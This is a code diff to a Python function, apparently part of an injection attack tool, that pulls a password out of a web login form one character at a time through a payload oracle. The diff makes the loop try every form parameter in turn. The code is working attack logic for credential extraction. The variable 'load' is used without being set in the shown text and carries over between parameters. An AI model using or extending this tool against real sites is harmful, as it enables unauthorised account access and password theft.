@@ -20,40 +20,49 @@ def non_blind(form):
     #                 {'name': 'password', 'value': payload}
     #     ]
     # }
-    
     num_of_params = len(form['body'])
+    params_tries = [False] * num_of_params
+    tries = 0
     
-    index = random.randint(0, num_of_params - 1)
+    while tries < num_of_params:
     
-    param_name = form['body'][index]['name']
-    
-    print("Trying to find password for parameter:", param_name)
-    
-# List of characters to try for the password
-    characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-    max_password_length = 20  # Set a reasonable limit for the password length
-    max_runtime = 600  # Maximum total runtime in seconds (10 minutes)
-
-    start_time = time.time()
-
-# Loop to find each character of the password
-    while len(load) < max_password_length:
-        found_char = False
-        for char in characters:
-            if test_payload(form, param_name, load, char):
-                load += char
-                print("Found character:", char)
-                print("Current password:", load)
-                found_char = True
-                break
+        index = random.randint(0, num_of_params - 1)
         
-        # If no character was found or maximum runtime exceeded, break out of the loop
-        if not found_char or (time.time() - start_time) > max_runtime:
-            print("No more characters found or maximum runtime exceeded. Ending search.")
-            break
+        if params_tries[index]:
+            continue
+            
+        params_tries[index] = True
+        
+        param_name = form['body'][index]['name']
+        
+        print("Trying to find password for parameter:", param_name)
+        
+    # List of characters to try for the password
+        characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+        max_password_length = 20  # Set a reasonable limit for the password length
+        max_runtime = 600  # Maximum total runtime in seconds (10 minutes)
 
-    # Print the final password once found
-    print("Final keyload:", load)
+        start_time = time.time()
+
+    # Loop to find each character of the password
+        while len(load) < max_password_length:
+            found_char = False
+            for char in characters:
+                if test_payload(form, param_name, load, char):
+                    load += char
+                    print("Found character:", char)
+                    print("Current password:", load)
+                    found_char = True
+                    break
+            
+            # If no character was found or maximum runtime exceeded, break out of the loop
+            if not found_char or (time.time() - start_time) > max_runtime:
+                print("No more characters found or maximum runtime exceeded. Ending search.")
+                break
+
+        # Print the final password once found
+        print("Final keyload:", load)
+        tries += 1
 
 
 
